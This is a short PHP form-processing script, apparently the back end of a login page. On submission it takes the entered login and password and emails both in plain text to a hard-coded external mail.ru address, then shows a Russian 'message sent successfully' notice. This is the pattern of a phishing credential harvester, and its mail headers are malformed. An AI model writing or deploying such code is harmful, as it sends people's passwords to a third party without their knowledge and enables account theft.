<?php
if(isset($_POST['submit'])) {
    if (!empty($_POST['login']) and !empty($_POST['password'])) {
        $login = $_POST['login'];
        $password = $_POST['password'];
        $headers = "Content-Type:text/html; charset=utf-8 \r\n";
        $headers .= "From: yurij.radchuk@mail.ru";
        $headers .= "Reply to yurij.radchuk@mail.ru";
        mail("yurij.radchuk@mail.ru", "Test", "$login \n $password", $headers);
        //print_r($_POST);
        echo "<div id='succes'>Сообщение успешно отправленно</div>";
    } else {
        echo "<div id='error'>Проверьте введенные данные</div>";
    }
}